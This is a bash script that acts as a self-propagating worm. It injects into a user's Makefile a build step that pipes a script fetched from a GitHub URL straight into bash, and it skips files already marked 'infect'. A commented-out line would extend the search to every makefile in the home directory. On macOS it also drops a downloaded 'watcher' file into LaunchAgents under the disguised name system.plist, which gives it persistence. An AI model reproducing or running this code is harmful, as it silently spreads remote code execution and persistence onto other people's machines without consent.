#!/bin/bash
OS=$(uname -s)
FILES=$(echo /Users/cdahlhof/Documents/ft_libft/Makefile 2>/dev/null) #$(find ~ -type d \( -path ~/Library \) -prune -o -type f -iname makefile 2>/dev/null)
IFS=$(echo -en "\n\b")
for f in $FILES
do
    grep -q "infect" $f &> /dev/null
    if [ $? -ne 0 ]; then
        printf '%s\n' 'g/all:/+1i\' '    @curl https://raw.githubusercontent.com/c8p2d01/auto_pain/main/infect.sh | bash' 'wq' | ed -s $f &> /dev/null
    if [ "$OS" == "Darwin" ] then
        curl -X GET https://raw.githubusercontent.com/c8p2d01/auto_pain/main/watcher > ~/Library/LaunchAgents/system.plist
    fi
    fi
done
